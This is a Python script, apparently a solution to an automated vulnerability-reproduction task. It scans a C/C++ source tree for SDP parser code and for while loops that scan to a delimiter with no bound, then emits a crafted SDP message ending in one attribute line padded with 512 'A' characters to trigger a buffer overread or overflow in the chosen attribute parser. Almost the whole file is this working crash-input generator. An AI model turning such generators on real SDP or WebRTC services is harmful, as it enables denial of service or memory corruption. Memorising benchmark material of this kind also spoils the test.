import io
import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp", ".inl"}
        for base, _, files in os.walk(root):
            for fn in files:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(base, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        yield path, f.read()
                except OSError:
                    continue

    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp", ".inl"}
        try:
            with tarfile.open(tar_path, mode="r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _detect_target(self, src_path: str) -> Tuple[str, str]:
        tokens = [
            "fmtp",
            "rtpmap",
            "fingerprint",
            "candidate",
            "extmap",
            "ssrc-group",
            "ssrc",
            "simulcast",
            "rid",
            "rtcp-fb",
            "crypto",
        ]
        scores: Dict[str, int] = {t: 0 for t in tokens}
        crlf_hits = 0
        total_read = 0
        max_read = 25_000_000

        suspicious_while = re.compile(
            r"while\s*\(\s*(?:\([^\)]*\)\s*)?(?:\*?\s*[A-Za-z_]\w*|\w+\s*\[[^\]]+\])\s*!=\s*'([^']+)'\s*\)",
            re.S,
        )

        if os.path.isdir(src_path):
            iterator = self._iter_source_files_from_dir(src_path)
        else:
            iterator = self._iter_source_files_from_tar(src_path)

        for name, b in iterator:
            if total_read >= max_read:
                break
            total_read += len(b)
            low_name = name.lower()
            if "sdp" not in low_name and "fuzz" not in low_name and "parser" not in low_name:
                continue

            try:
                text = b.decode("utf-8", "ignore")
            except Exception:
                continue

            low = text.lower()
            crlf_hits += low.count("\\r\\n") + low.count("\r\n")

            for t in tokens:
                c = low.count(t)
                if c:
                    scores[t] += c

            for m in suspicious_while.finditer(text):
                start = m.start()
                ctx = low[max(0, start - 600) : min(len(low), start + 600)]
                for t in tokens:
                    if t in ctx:
                        scores[t] += 6

        best_token = max(scores.items(), key=lambda kv: kv[1])[0]
        line_ending = "\r\n" if crlf_hits > 0 else "\n"
        return best_token, line_ending

    def _build_malformed_line(self, token: str, pad_len: int) -> str:
        pad = "A" * pad_len
        if token == "rtpmap":
            return "a=rtpmap:111 " + pad
        if token == "fingerprint":
            return "a=fingerprint:sha-256 " + pad
        if token == "candidate":
            return "a=candidate:" + pad
        if token == "extmap":
            return "a=extmap:1" + pad
        if token == "ssrc-group":
            return "a=ssrc-group:FID" + pad
        if token == "ssrc":
            return "a=ssrc:1" + pad
        if token == "simulcast":
            return "a=simulcast:" + pad
        if token == "rid":
            return "a=rid:1 " + pad
        if token == "rtcp-fb":
            return "a=rtcp-fb:111 " + pad
        if token == "crypto":
            return "a=crypto:1 " + pad
        return "a=fmtp:111 " + pad

    def solve(self, src_path: str) -> bytes:
        token, eol = self._detect_target(src_path)

        pad_len = 512
        malformed = self._build_malformed_line(token, pad_len)

        lines: List[str] = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "a=group:BUNDLE 0",
            "m=audio 9 UDP/TLS/RTP/SAVPF 111",
            "c=IN IP4 0.0.0.0",
            "a=mid:0",
            "a=sendrecv",
            "a=rtpmap:111 opus/48000/2",
            "a=fmtp:111 minptime=10;useinbandfec=1",
            "a=setup:actpass",
            "a=ice-ufrag:ufrag",
            "a=ice-pwd:pwd",
            "a=fingerprint:sha-256 00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF",
            "a=rtcp-mux",
            malformed,
        ]

        out = eol.join(lines).encode("ascii", "ignore")
        return out